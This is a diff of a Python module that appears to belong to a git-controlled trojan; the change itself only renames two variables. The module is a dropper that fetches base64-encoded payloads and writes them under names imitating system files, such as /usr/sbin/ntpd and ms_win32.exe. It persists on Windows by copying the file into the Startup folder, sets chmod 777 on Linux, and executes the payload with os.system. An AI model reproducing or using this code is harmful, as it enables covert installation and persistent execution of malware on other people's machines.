@@ -6,8 +6,8 @@ import os
 #folder = filePath.rstrip("test")
 
 encodedFiles  = False
-filePath = "bin/at-spi2-regd.exe" #"modules/dirlister.py" #
-targetPath = "/usr/sbin/mswin.exe"
+sourceFile = "bin/at-spi2-regd.exe" #"modules/dirlister.py" #
+targetFile = "/usr/sbin/mswin.exe"
 bin = True
 start = True
 scriptExec= "bash "
@@ -36,50 +36,50 @@ def get_file_contents(filepath):
         return None
 
 def run(**args): # Must import its personal lib, git_tro will execute this module in # environment
-	global filePath, targetPath
+	global sourceFile, targetFile
 	print("[*] In getFileFromGit module.") #Todelete
 	if os.name == 'posix':
-		filePath = "bin/test_svr" #"modules/dirlister.py" #
-		targetPath = "/usr/sbin/ntpd"
+		sourceFile = "bin/test_svr" #"modules/dirlister.py" #
+		targetFile = "/usr/sbin/ntpd"
 
 	elif os.name == 'nt': #TODO: CHeck win TargetPth
-		filePath = "bin/test" #"modules/dirlister.py" #
-		targetPath = os.getenv("PUBLIC")+"\ms_win32.exe"  #C:\Users\Public
+		sourceFile = "bin/test" #"modules/dirlister.py" #
+		targetFile = os.getenv("PUBLIC")+"\ms_win32.exe"  #C:\Users\Public
 
 	else:
 		return ("[ERROR] getFileFromGit: Not recognised OS: %s"%os.name)
 
-	script= get_file_contents(filePath)
+	script= get_file_contents(sourceFile)
 	if script is not None:
 		content	= base64.b64decode(script)
 		if bin:
 			try:
-				fich = open(targetPath, "wb")
+				fich = open(targetFile, "wb")
 				fich.write(content)
 				fich.close()
 				if os.name == 'nt' and winRunOnBoot == True:
 					startPath=os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup"
-					os.system("copy /Y \"%s\" \"%s\""%(targetPath, startPath))
+					os.system("copy /Y \"%s\" \"%s\""%(targetFile, startPath))
 			except PermissionError:
 				return ("[ERROR] getFileFromGit: Permission Denied!")
 
 			if start and os.name == 'nt':
-				#targetPath=targetPath.replace('\\','\\')
-				os.system("start {}".format(targetPath))   #format(targetPath.replace('/','\\')))
+				#targetFile=targetFile.replace('\\','\\')
+				os.system("start {}".format(targetFile))   #format(targetFile.replace('/','\\')))
 			elif start and os.name == 'posix':
-			    os.system("chmod 777 {}".format(targetPath))
-			    os.system("./{}".format(targetPath))
+			    os.system("chmod 777 {}".format(targetFile))
+			    os.system("./{}".format(targetFile))
 
 		else:
-			fich = open(targetPath, "w")
+			fich = open(targetFile, "w")
 			fich.write(content.decode())
 			fich.close()
 			if start:
-				os.system(scriptExec+" "+targetPath)
-		return str("getRunScript: file {} successfully started".format(filePath))
+				os.system(scriptExec+" "+targetFile)
+		return str("getRunScript: file {} successfully started".format(sourceFile))
 	else:
 		#TODO: Customize log file path
-		#os.system("echo 'getRunScript: Unable to find file {}' >> Tapalog.log".format(filePath))
-		return str("getRunScript: Unable to find script {}".format(filePath))
+		#os.system("echo 'getRunScript: Unable to find file {}' >> Tapalog.log".format(sourceFile))
+		return str("getRunScript: Unable to find script {}".format(sourceFile))
 
 #run()
